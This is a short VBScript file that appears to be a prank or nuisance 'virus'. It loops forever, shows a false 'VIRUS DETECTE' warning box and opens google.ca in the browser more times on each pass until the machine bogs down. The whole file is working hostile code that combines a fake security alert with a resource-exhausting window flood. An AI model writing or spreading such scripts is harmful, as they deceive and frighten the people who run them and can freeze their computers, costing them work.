
Dim sURL 
Dim objShell
Dim iNbFois

iNbFois = 1


sURL = "https://www.google.ca/?hl=fr"

Do While true
        a = msgbox("VIRUS DETECTE" ,16, "ATTENTION")
        For i2 = 1 to iNbFois
                set objShell = CreateObject("WScript.Shell")
                objShell.run(sURL)
            WScript.Sleep 100
        Next
        iNbFois = iNbFois + 1
Loop